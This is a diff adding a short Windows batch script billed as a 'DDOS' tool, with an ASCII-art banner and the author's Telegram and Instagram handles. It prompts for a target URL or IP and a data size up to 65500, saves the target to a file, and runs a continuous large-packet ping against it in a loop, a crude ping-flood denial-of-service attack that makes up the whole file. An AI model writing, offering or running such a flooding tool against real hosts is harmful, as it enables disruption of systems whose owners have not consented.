@@ -1,0 +1,23 @@
+@echo off
+
+title      DDOS !
+color D9
+:S
+echo #####   #####   #####  ####
+echo #    #  #    #  #   #  #
+echo #    #  #    #  #   #  ####
+echo #   ##  #   ##  #   #     # [Tel: LilMoS]
+echo ####    ####    #####  #### [INSTA LiL.M.O.S]
+echo - - -
+echo - - -
+
+SET /p u=  "SEND YOUR [URL/IP]:"
+echo - - -
+echo - - -
+echo %u% > TargetUrl.txt
+SET /p p="SEND DATA SIZE[0/65500]:"
+ping %u% -t -l %p%
+echo SenDeD!
+pause
+
+goto:S
